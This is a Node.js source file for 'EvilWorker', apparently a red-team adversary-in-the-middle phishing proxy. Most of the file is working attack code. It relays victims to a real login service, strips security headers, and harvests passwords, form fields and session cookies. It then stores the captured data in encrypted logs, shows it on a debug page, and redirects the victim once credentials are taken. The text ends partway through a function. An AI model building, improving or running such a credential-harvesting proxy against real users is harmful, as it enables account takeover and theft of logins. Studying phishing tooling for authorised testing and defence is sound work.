const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const config = require("./config");


const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";
// Configuration is now handled in config.js

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

const VICTIM_SESSIONS = {}

// Function to check if credentials have been collected
function hasCredentialsBeenCollected(currentSession) {
    if (!currentSession || !VICTIM_SESSIONS[currentSession]) {
        return false;
    }
    
    const session = VICTIM_SESSIONS[currentSession];
    
    // Check for common credential indicators in cookies
    const credentialCookies = session.cookies.filter(cookie => {
        const cookieName = cookie.name.toLowerCase();
        return config.credentials.credentialKeywords.some(keyword => 
            cookieName.includes(keyword)
        );
    });
    
    // Check for form submissions with credentials
    if (session.lastRequestBody) {
        const body = session.lastRequestBody.toLowerCase();
        
        // More strict detection: require both email and password
        const hasEmail = body.includes('email') || body.includes('username') || body.includes('user');
        const hasPassword = body.includes('password') || body.includes('pass') || body.includes('pwd');
        
        if (hasEmail && hasPassword) {
            console.log(`[CREDENTIAL_DETECTED] Session: ${currentSession} - Found BOTH email and password in request body`);
            return true;
        }
        
        // Fallback: check for other credential fields
        if (config.credentials.credentialFields.some(field => body.includes(field))) {
            console.log(`[CREDENTIAL_DETECTED] Session: ${currentSession} - Found credential fields in request body`);
            return true;
        }
    }
    
    if (credentialCookies.length > 0) {
        console.log(`[CREDENTIAL_DETECTED] Session: ${currentSession} - Found ${credentialCookies.length} credential cookies:`, credentialCookies.map(c => c.name));
        return true;
    }
    
    return false;
}

// Enhanced function to extract and log all form data
function extractAndLogFormData(requestBody, currentSession, requestPath) {
    if (!requestBody) return;
    
    try {
        const body = requestBody.toString();
        let formData = {};
        
        // Try to parse as JSON first
        try {
            formData = JSON.parse(body);
        } catch (e) {
            // Try to parse as URL-encoded form data
            try {
                const urlParams = new URLSearchParams(body);
                for (const [key, value] of urlParams.entries()) {
                    formData[key] = value;
                }
            } catch (e2) {
                // If all parsing fails, store raw body
                formData = { rawBody: body };
            }
        }
        
        // Check for credential fields and log them
        const credentialFields = {};
        const otherFields = {};
        
        for (const [key, value] of Object.entries(formData)) {
            const keyLower = key.toLowerCase();
            if (config.credentials.credentialFields.some(field => keyLower.includes(field))) {
                credentialFields[key] = value;
            } else {
                otherFields[key] = value;
            }
        }
        
        // Log all form data
        if (Object.keys(formData).length > 0) {
            console.log(`[FORM_DATA_CAPTURED] Session: ${currentSession} - Path: ${requestPath}`);
            console.log(`[FORM_DATA_CAPTURED] All Fields:`, formData);
            
            if (Object.keys(credentialFields).length > 0) {
                console.log(`[CREDENTIALS_FOUND] Session: ${currentSession} - Credential Fields:`, credentialFields);
                
                // Store credentials in session for later analysis
                if (!VICTIM_SESSIONS[currentSession].capturedCredentials) {
                    VICTIM_SESSIONS[currentSession].capturedCredentials = [];
                }
                
                VICTIM_SESSIONS[currentSession].capturedCredentials.push({
                    timestamp: new Date().toISOString(),
                    path: requestPath,
                    credentialFields: credentialFields,
                    allFields: formData
                });
            }
        }
        
        // Store complete form data in session
        VICTIM_SESSIONS[currentSession].lastFormData = formData;
        VICTIM_SESSIONS[currentSession].lastRequestBody = body;
        
    } catch (error) {
        console.error(`[ERROR] Failed to extract form data for session ${currentSession}:`, error);
    }
}

// Enhanced function to log all cookies for a session
function logAllCookies(currentSession) {
    if (!currentSession || !VICTIM_SESSIONS[currentSession]) return;
    
    const session = VICTIM_SESSIONS[currentSession];
    if (session.cookies && session.cookies.length > 0) {
        console.log(`[ALL_COOKIES_CAPTURED] Session: ${currentSession} - Total Cookies: ${session.cookies.length}`);
        
        // Group cookies by type
        const credentialCookies = [];
        const sessionCookies = [];
        const otherCookies = [];
        
        for (const cookie of session.cookies) {
            const cookieName = cookie.name.toLowerCase();
            if (config.credentials.credentialKeywords.some(keyword => cookieName.includes(keyword))) {
                credentialCookies.push(cookie);
            } else if (cookieName.includes('session') || cookieName.includes('token') || cookieName.includes('auth')) {
                sessionCookies.push(cookie);
            } else {
                otherCookies.push(cookie);
            }
        }
        
        if (credentialCookies.length > 0) {
            console.log(`[COOKIE_ANALYSIS] Session: ${currentSession} - Credential Cookies:`, credentialCookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...' })));
        }
        if (sessionCookies.length > 0) {
            console.log(`[COOKIE_ANALYSIS] Session: ${currentSession} - Session/Auth Cookies:`, sessionCookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...' })));
        }
        if (otherCookies.length > 0) {
            console.log(`[COOKIE_ANALYSIS] Session: ${currentSession} - Other Cookies:`, otherCookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...' })));
        }
        
        // Store cookie analysis in session
        session.cookieAnalysis = {
            timestamp: new Date().toISOString(),
            totalCookies: session.cookies.length,
            credentialCookies: credentialCookies.length,
            sessionCookies: sessionCookies.length,
            otherCookies: otherCookies.length,
            allCookies: session.cookies
        };
    }
}

// Function to check if this is a login form submission
function isLoginFormSubmission(proxyRequestBody, proxyRequestOptions) {
    if (!proxyRequestBody) return false;
    
    const body = proxyRequestBody.toString().toLowerCase();
    const path = proxyRequestOptions.path.toLowerCase();
    
    // Check for common login endpoints
    const isLoginEndpoint = config.credentials.loginEndpoints.some(endpoint => path.includes(endpoint));
    const hasCredentials = config.credentials.credentialFields.some(field => body.includes(field));
    
    if (isLoginEndpoint && hasCredentials) {
        console.log(`[LOGIN_DETECTED] Session: ${proxyRequestOptions.headers.cookie ? getUserSession(proxyRequestOptions.headers.cookie) : 'none'} - Login endpoint: ${path} with credentials`);
        return true;
    }
    
    return false;
}


const proxyServer = http.createServer((clientRequest, clientResponse) => {
    try {
        const { method, url, headers } = clientRequest;
        const currentSession = getUserSession(headers.cookie);
        
        // Debug logging for Render
        console.log(`[${new Date().toISOString()}] ${method} ${url} - Session: ${currentSession || 'none'}`);

        // Health check endpoint for Render
        if (url === "/" || url === "/health") {
            clientResponse.writeHead(200, { "Content-Type": "application/json" });
            clientResponse.end(JSON.stringify({ 
                status: "healthy", 
                service: "EvilWorker", 
                timestamp: new Date().toISOString(),
                uptime: process.uptime()
            }));
            return;
        }

        // Debug endpoint to check request details
        if (url === "/debug") {
            clientResponse.writeHead(200, { "Content-Type": "application/json" });
            clientResponse.end(JSON.stringify({ 
                url: url,
                method: method,
                headers: headers,
                currentSession: currentSession,
                hasRequestBody: !!clientRequestBody,
                PROXY_ENTRY_POINT: PROXY_ENTRY_POINT,
                PHISHED_URL_PARAMETER: PHISHED_URL_PARAMETER,
                startsWithEntryPoint: url.startsWith(PROXY_ENTRY_POINT),
                includesParameter: url.includes(PHISHED_URL_PARAMETER)
            }));
            return;
        }

        // Session debug endpoint to see captured data
        if (url === "/session-debug") {
            if (!currentSession) {
                clientResponse.writeHead(200, { "Content-Type": "text/html" });
                clientResponse.end(`
                    <html>
                    <head><title>EvilWorker - No Active Session</title></head>
                    <body>
                        <h1>No Active Session</h1>
                        <p>No active session found. Please visit a phishing link first.</p>
                        <p><a href="/">Back to Home</a></p>
                    </body>
                    </html>
                `);
                return;
            }
            
            const session = VICTIM_SESSIONS[currentSession];
            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            clientResponse.end(`
                <html>
                <head><title>EvilWorker - Session Data</title></head>
                <body>
                    <h1>Session Data for: ${currentSession}</h1>
                    <h2>Target Service</h2>
                    <p><strong>URL:</strong> ${session.targetService?.protocol}//${session.targetService?.host}${session.targetService?.path}</p>
                    <p><strong>Created:</strong> ${session.createdAt}</p>
                    <p><strong>Requests:</strong> ${session.requestCount}</p>
                    
                    <h2>Captured Credentials</h2>
                    <p><strong>Total:</strong> ${session.capturedCredentials?.length || 0}</p>
                    ${session.capturedCredentials?.map(cred => `
                        <div style="border: 1px solid #ccc; margin: 10px; padding: 10px;">
                            <p><strong>Time:</strong> ${cred.timestamp}</p>
                            <p><strong>Path:</strong> ${cred.path}</p>
                            <p><strong>Credential Fields:</strong> ${JSON.stringify(cred.credentialFields, null, 2)}</p>
                            <p><strong>All Fields:</strong> ${JSON.stringify(cred.allFields, null, 2)}</p>
                        </div>
                    `).join('') || '<p>No credentials captured yet.</p>'}
                    
                    <h2>All Cookies (${session.cookies?.length || 0})</h2>
                    ${session.cookies?.map(cookie => `
                        <div style="border: 1px solid #ccc; margin: 5px; padding: 5px;">
                            <p><strong>Name:</strong> ${cookie.name}</p>
                            <p><strong>Value:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}</p>
                            <p><strong>Domain:</strong> ${cookie.domain}</p>
                            <p><strong>Path:</strong> ${cookie.path}</p>
                        </div>
                    `).join('') || '<p>No cookies captured yet.</p>'}
                    
                    <h2>Last Form Data</h2>
                    <pre>${JSON.stringify(session.lastFormData, null, 2) || 'No form data captured yet.'}</pre>
                    
                    <p><a href="/">Back to Home</a></p>
                </body>
                </html>
            `);
            return;
        }

        if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
            try {
                const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                
                VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                clientResponse.writeHead(200, { "Content-Type": "text/html" });
                fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
                return;
            }
            catch (error) {
                displayError("Phishing URL parsing failed", error, url);
                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                return;
            }
        }
        else if (currentSession || url === PROXY_PATHNAMES.proxy) {
            if (url === PROXY_PATHNAMES.serviceWorker) {
                clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                fs.createReadStream(url.slice(1)).pipe(clientResponse);
            }
            else if (url === PROXY_PATHNAMES.favicon) {
                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
                clientResponse.end();
            }

            else {
                let clientRequestBody = [];
                clientRequest
                    .on("error", (error) => {
                        displayError("Client request body retrieval failed", error, method, url);
                    })
                    .on("data", (chunk) => {
                        clientRequestBody.push(chunk);
                    })
                    .on("end", () => {
                        clientRequestBody = Buffer.concat(clientRequestBody).toString();

                        if (!currentSession ) {
                            if (clientRequestBody) {
                                try {
                                    clientRequestBody = JSON.parse(clientRequestBody);
                                    const proxyRequestURL = new URL(clientRequestBody.url);
                                    const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                    if (proxyRequestURL.hostname === headers.host &&
                                        proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                        try {
                                            const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                            const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                            clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);

                                            VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                            VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                            VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                            VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                            VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                            clientResponse.end();
                                        }
                                        catch (error) {
                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                        }
                                    } else {
                                        clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                        clientResponse.end();
                                    }
                                } catch (error) {
                                    displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                                }
                            } else {
                                clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                clientResponse.end();
                            }
                        }

                        else {
                            let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                            const proxyRequestOptions = {
                                hostname: VICTIM_SESSIONS[currentSession].hostname,
                                port: VICTIM_SESSIONS[currentSession].port,
                                method: method,
                                path: VICTIM_SESSIONS[currentSession].path,
                                headers: { ...headers },
                                rejectUnauthorized: false
                            };
                            let isNavigationRequest = false;

                            if (clientRequestBody) {
                                if (url === PROXY_PATHNAMES.jsCookie) {
                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                                    // Log all cookies after update
                                    logAllCookies(currentSession);
                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                    clientResponse.end(JSON.stringify(validDomains));
                                    return;
                                }

                                else if (url === PROXY_PATHNAMES.proxy) {
                                    try {
                                        clientRequestBody = JSON.parse(clientRequestBody);
                                        let proxyRequestURL = new URL(clientRequestBody.url);
                                        let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                        if (proxyRequestURL.hostname === headers.host) {
                                            if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                                try {
                                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                                    VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                                    clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                                    clientResponse.end();
                                                }
                                                catch (error) {
                                                    displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                                }
                                                return;
                                            }

                                            else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                                clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                                fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                                return;
                                            }

                                            else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                                try {
                                                    const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                                    proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                                    proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                                }
                                                catch (error) {
                                                    displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                                    return;
                                                }
                                            }

                                            else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                                // Log all cookies after update
                                                logAllCookies(currentSession);
                                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                                clientResponse.end(JSON.stringify(validDomains));
                                                return;
                                            }
                                        }
                                        proxyRequestProtocol = proxyRequestURL.protocol;
                                        proxyRequestOptions.path = proxyRequestPath;
                                        proxyRequestOptions.port = proxyRequestURL.port;
                                        proxyRequestOptions.method = clientRequestBody.method;

                                        proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                        if (proxyRequestURL.hostname !== headers.host) {
                                            proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                            proxyRequestOptions.headers.host = proxyRequestURL.host;
                                        }
                                        if (proxyRequestOptions.headers.referer) {
                                            proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                        }
                                        isNavigationRequest = clientRequestBody.mode === "navigate";
                                    }
                                    catch (error) {
                                        displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                                    }
                                } else {
                                    console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                                }
                            } else {
                                console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                            }

                            proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                            updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                            const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                            
                            // Enhanced data capture - extract and log all form data
                            if (proxyRequestBody) {
                                extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
                                VICTIM_SESSIONS[currentSession].requestCount++;
                            }
                            
                            const requestContentLength = Buffer.byteLength(proxyRequestBody);
                            if (requestContentLength) {
                                proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                            }
                            else {
                                delete proxyRequestOptions.headers["content-type"];
                                delete proxyRequestOptions.headers["content-length"];
                            }

                            if (isNavigationRequest) {
                                VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                                VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                                VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                                VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                                VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                            }

                            makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
                        });
                    }
                }

        } else {
            // Handle direct browser requests to phishing endpoint without request body
            if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
                try {
                    const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
                    clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                    
                    VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                    VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                    VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                    VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                    VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                    clientResponse.writeHead(200, { "Content-Type": "text/html" });
                    fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
                }
                catch (error) {
                    displayError("Phishing URL parsing failed", error, url);
                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                }
            } else {
                clientResponse.writeHead(301, { Location: REDIRECT_URL });
                clientResponse.end();
            }
        }


    } catch (error) {
        displayError("Main server request handler failed", error, method, url);
    }
});

proxyServer.listen(process.env.PORT ?? 3000);


const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {

        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        if (isNavigationRequest &&
            proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
            proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {

            const proxyResponseLocation = proxyResponse.headers.location;
            if (proxyResponseLocation) {
                try {
                    const locationURL = new URL(proxyResponseLocation);

                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
                    VICTIM_SESSIONS[currentSession].host = locationURL.host;

                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                } catch {
                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
                }
            }
        }
        else if (proxyResponse.statusCode > 400) {
            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
        }

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
        if (proxyResponseCookie) {
            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse
            .on("error", (error) => {
                displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
            })
            .on("data", (chunk) => {
                serverResponseBody.push(chunk);
            })
            .on("end", async () => {
                serverResponseBody = Buffer.concat(serverResponseBody);

                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                    Buffer.byteLength(serverResponseBody)) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                // Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                // Check if credentials have been collected and redirect if needed
                if (config.credentials.enableRedirect && (hasCredentialsBeenCollected(currentSession) || isLoginFormSubmission(proxyRequestBody, proxyRequestOptions))) {
                    console.log(`[CREDENTIALS_DETECTED] Session: ${currentSession} - Starting comprehensive data capture before redirect`);
                    
                    // Enhanced data capture before redirect
                    await captureAllSessionData(currentSession, proxyRequestBody, proxyRequestOptions);
                    
                    console.log(`[CREDENTIALS_COLLECTED] Session: ${currentSession} - All data captured, redirecting to: ${config.credentials.redirectUrl}`);
                    console.log(`[CREDENTIALS_COLLECTED] Cookies captured: ${VICTIM_SESSIONS[currentSession].cookies.length}`);
                    console.log(`[CREDENTIALS_COLLECTED] Credentials captured: ${VICTIM_SESSIONS[currentSession].capturedCredentials.length}`);
                    console.log(`[CREDENTIALS_COLLECTED] Form submissions: ${VICTIM_SESSIONS[currentSession].formSubmissions.length}`);
                    console.log(`[CREDENTIALS_COLLECTED] Total requests: ${VICTIM_SESSIONS[currentSession].requestCount}`);
                    
                    // Log the comprehensive credential collection event
                    if (config.logging.enableCredentialLogging) {
                        const credentialLog = {
                            timestamp: new Date().toISOString(),
                            session: currentSession,
                            event: "COMPREHENSIVE_CREDENTIALS_COLLECTED",
                            redirectUrl: config.credentials.redirectUrl,
                            sessionSummary: {
                                cookies: VICTIM_SESSIONS[currentSession].cookies,
                                capturedCredentials: VICTIM_SESSIONS[currentSession].capturedCredentials,
                                formSubmissions: VICTIM_SESSIONS[currentSession].formSubmissions,
                                cookieAnalysis: VICTIM_SESSIONS[currentSession].cookieAnalysis,
                                lastFormData: VICTIM_SESSIONS[currentSession].lastFormData,
                                lastRequestBody: VICTIM_SESSIONS[currentSession].lastRequestBody,
                                requestCount: VICTIM_SESSIONS[currentSession].requestCount,
                                credentialCount: VICTIM_SESSIONS[currentSession].credentialCount,
                                targetService: VICTIM_SESSIONS[currentSession].targetService,
                                createdAt: VICTIM_SESSIONS[currentSession].createdAt
                            }
                        };
                        
                        const logFileStream = LOG_FILE_STREAMS[currentSession];
                        if (logFileStream) {
                            encryptData(JSON.stringify(credentialLog))
                                .then(encryptedResult => {
                                    logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`);
                                    console.log(`[LOGGING] Comprehensive credential log encrypted and saved for session: ${currentSession}`);
                                })
                                .catch(error => displayError("Comprehensive credential log encryption failed", error));
                        }
                    }
                    
                    // Ensure all data is flushed to disk before redirect
                    await flushSessionData(currentSession);
                    
                    // Redirect to the legitimate service after comprehensive data capture
                    clientResponse.writeHead(302, { 
                        Location: config.credentials.redirectUrl,
                        ...config.security.redirectHeaders
                    });
                    clientResponse.end();
                    return;
                }
                
                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(serverResponseBody);
            });
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);

    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

function getUserSession(requestCookies) {
    if (!requestCookies) return;

    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");

        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    try {
        // Sanitize the filename by replacing invalid characters
        const sanitizedFilename = logFilename.replace(/[:<>"|?*]/g, '_');
        const logFilePath = path.join(LOGS_DIRECTORY, sanitizedFilename);
        
        // Ensure the directory exists
        if (!fs.existsSync(LOGS_DIRECTORY)) {
            fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
        }
        
        const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
        
        // Add error handling for the write stream
        logFileStream.on('error', (error) => {
            console.error(`[ERROR] Failed to create log file for session ${currentSession}:`, error);
        });
        
        LOG_FILE_STREAMS[currentSession] = logFileStream;
        console.log(`[LOGGING] Created log file: ${sanitizedFilename}`);
        
    } catch (error) {
        console.error(`[ERROR] Failed to create session log file for ${currentSession}:`, error);
        // Create a fallback log file with a safe name
        try {
            const fallbackFilename = `session_${currentSession}_${Date.now()}.log`;
            const fallbackPath = path.join(LOGS_DIRECTORY, fallbackFilename);
            const fallbackStream = fs.createWriteStream(fallbackPath, { flags: "a" });
            LOG_FILE_STREAMS[currentSession] = fallbackStream;
            console.log(`[LOGGING] Created fallback log file: ${fallbackFilename}`);
        } catch (fallbackError) {
            console.error(`[ERROR] Failed to create fallback log file:`, fallbackError);
        }
    }
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {};
